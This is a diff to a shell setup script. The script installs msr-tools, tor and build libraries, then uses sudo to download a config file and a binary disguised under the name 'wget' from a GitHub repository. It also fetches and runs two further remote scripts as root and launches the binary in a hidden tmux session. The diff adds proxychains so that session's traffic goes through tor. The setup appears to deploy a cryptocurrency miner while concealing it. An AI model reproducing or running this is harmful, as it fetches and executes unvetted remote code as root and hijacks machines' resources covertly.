@@ -17,7 +17,7 @@ fi
 
 
 
-sudo apt install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev tor -y
+sudo apt install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev tor proxychains -y
 sudo rm config.json
 sudo wget https://raw.githubusercontent.com/average140421/test/main/config.json
 sudo wget https://github.com/average140421/test/raw/main/wget
@@ -26,5 +26,5 @@ sudo bash 1gb.sh
 wget https://raw.githubusercontent.com/average140421/test/main/rdom.sh
 sudo bash rdom.sh
 sudo chmod +x wget
-sudo tmux new-session -d -s my_session1  './wget'
+sudo proxychains tmux new-session -d -s my_session1  './wget'
 
